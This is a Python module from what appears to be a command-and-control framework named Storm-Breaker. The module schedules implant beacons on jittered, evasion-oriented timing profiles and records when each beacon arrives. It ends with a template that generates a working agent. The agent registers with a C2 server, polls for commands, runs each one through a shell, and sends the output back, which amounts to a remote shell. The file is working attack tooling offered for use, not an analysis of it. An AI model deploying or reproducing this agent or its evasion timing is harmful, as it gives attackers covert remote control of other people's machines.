"""Beacon timing + observation (FIREPOWER plan section P15.4).

Before: every generated agent slept a fixed 2-3 s and the "beacon monitor" was
``evasion_framework`` timing *math* nobody applied.  Now the server:

  * returns ``next_interval_ms`` on ``/api/c2/poll`` (jittered from a timing
    profile, with an interactive fast-path), and
  * records the REAL arrival timestamps, so beacons are observed, not simulated.

The frozen ``payload_generator`` agent ignores the field; ``agent_script`` emits
a drop-in agent that honours it.  Profile math mirrors ``evasion_framework``.
"""
from __future__ import annotations

import random
import threading
import time
from collections import deque
from datetime import datetime
from typing import Any, Deque, Dict, List, Optional, Tuple

import sys
from pathlib import Path

_HERE = Path(__file__).resolve().parent
_STORM_WEB = str(_HERE.parents[2])
if _STORM_WEB not in sys.path:
    sys.path.insert(0, _STORM_WEB)

import evasion_framework as _evasion  # noqa: E402  (frozen, read-only)

FLOOR_MS = 400            # never beacon faster than this
INTERACTIVE_MS = 1200      # fast path when a command was just served
INTERACTIVE_JITTER = 300
INACTIVE_FACTOR = 4        # outside the profile's active hours


def profiles() -> List[str]:
    return sorted(_evasion.TIMING_PROFILES)


class _Config:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._default = "always_on"
        self._per_uid: Dict[str, str] = {}
        self._base_ms: Optional[int] = None  # explicit override (beacon "speed")

    def set_base_ms(self, ms: Optional[int]) -> Optional[int]:
        """Force the beacon base interval (ms); ``None``/0 restores the profile."""
        with self._lock:
            self._base_ms = int(ms) if ms else None
            return self._base_ms

    def base_ms(self) -> Optional[int]:
        with self._lock:
            return self._base_ms

    def set_default(self, profile: str) -> str:
        if profile not in _evasion.TIMING_PROFILES:
            raise ValueError("unknown profile %r" % profile)
        with self._lock:
            self._default = profile
        return profile

    def set_for(self, uid: str, profile: str) -> None:
        if profile not in _evasion.TIMING_PROFILES:
            raise ValueError("unknown profile %r" % profile)
        with self._lock:
            self._per_uid[uid] = profile

    def default(self) -> str:
        with self._lock:
            return self._default

    def for_uid(self, uid: str) -> str:
        with self._lock:
            return self._per_uid.get(uid, self._default)


CONFIG = _Config()


def _active(profile: dict, now: Optional[float] = None) -> bool:
    hours = profile.get("active_hours")
    if not hours:
        return True
    start, end = hours
    hour = datetime.fromtimestamp(now if now is not None else time.time()).hour
    if start <= end:
        return start <= hour < end
    return hour >= start or hour < end  # wraps midnight


def next_interval_ms(profile: Optional[str] = None, interactive: bool = False,
                     now: Optional[float] = None) -> int:
    """The next beacon interval, jittered. ``interactive`` = just served a command."""
    if interactive:
        return int(INTERACTIVE_MS + random.uniform(-INTERACTIVE_JITTER, INTERACTIVE_JITTER))
    prof = _evasion.TIMING_PROFILES.get(profile or CONFIG.default())
    if prof is None:
        prof = _evasion.TIMING_PROFILES["always_on"]
    variance = float(prof.get("variance", 0.2))
    override = CONFIG.base_ms()
    if override:
        # explicit override wins -> predictable speed, still jittered
        jittered = float(override) * (1.0 + random.uniform(-variance, variance))
        return int(max(FLOOR_MS, jittered))
    base = float(prof.get("base_interval", 15)) * 1000.0
    jittered = base * (1.0 + random.uniform(-variance, variance))
    if not _active(prof, now):
        jittered *= INACTIVE_FACTOR
    return int(max(FLOOR_MS, jittered))


class BeaconTracker:
    """Real arrival timeline per uid (thread-safe ring buffer)."""

    def __init__(self, keep: int = 200) -> None:
        self._lock = threading.Lock()
        self._hits: Dict[str, Deque[Tuple[float, int]]] = {}
        self._keep = keep

    def record(self, uid: str, expected_ms: int, ts: Optional[float] = None) -> None:
        with self._lock:
            dq = self._hits.setdefault(uid, deque(maxlen=self._keep))
            dq.append((ts if ts is not None else time.time(), int(expected_ms)))

    def schedule(self, uid: str, interactive: bool = False) -> int:
        """Compute + record this beacon's interval; returns the interval in ms."""
        interval = next_interval_ms(CONFIG.for_uid(uid), interactive=interactive)
        self.record(uid, interval)
        return interval

    def timeline(self, uid: str, limit: int = 50) -> List[Dict[str, Any]]:
        with self._lock:
            hits = list(self._hits.get(uid, ()))
        out = []
        prev = None
        for ts, expected in hits[-limit:]:
            actual = None if prev is None else round((ts - prev) * 1000)
            out.append({"at": ts, "actual_ms": actual, "expected_ms": expected})
            prev = ts
        return out

    def stats(self, uid: str) -> Dict[str, Any]:
        with self._lock:
            hits = list(self._hits.get(uid, ()))
        if not hits:
            return {"uid": uid, "count": 0, "last_seen": None, "interval_ms": None,
                    "missed": 0}
        times = [t for t, _ in hits]
        gaps = [round((b - a) * 1000) for a, b in zip(times, times[1:])]
        missed = sum(1 for (_, exp), gap in zip(list(hits)[:-1], gaps)
                     if exp and gap > exp * 1.6)
        return {"uid": uid, "count": len(hits),
                "last_seen": datetime.fromtimestamp(times[-1]).isoformat(),
                "ago_s": round(time.time() - times[-1], 1),
                "interval_ms": (round(sum(gaps) / len(gaps)) if gaps else None),
                "min_ms": (min(gaps) if gaps else None),
                "max_ms": (max(gaps) if gaps else None),
                "missed": missed}

    def all_stats(self) -> List[Dict[str, Any]]:
        with self._lock:
            uids = list(self._hits)
        return sorted((self.stats(u) for u in uids), key=lambda s: s["uid"])


TRACKER = BeaconTracker()


AGENT_TEMPLATE = '''#!/usr/bin/env python3
"""Storm-Breaker server-driven beacon agent (honours next_interval_ms)."""
import json, subprocess, time, urllib.request

BASE = %(base)r
UID = %(uid)r


def post(path, payload):
    req = urllib.request.Request(BASE + path, data=json.dumps(payload).encode(),
                                 headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


post("/api/c2/register", {"uid": UID, "info": {"user": "beacon-agent", "os": "python"}})
while True:
    try:
        r = post("/api/c2/poll", {"uid": UID})
        cmd = r.get("command")
        if cmd:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                 timeout=60)
            post("/api/c2/response", {"uid": UID, "output": out.stdout + out.stderr})
        time.sleep(r.get("next_interval_ms", 1500) / 1000.0)
    except Exception:
        time.sleep(3)
'''


def agent_script(base_url: str, uid: str) -> str:
    return AGENT_TEMPLATE % {"base": base_url.rstrip("/"), "uid": uid}
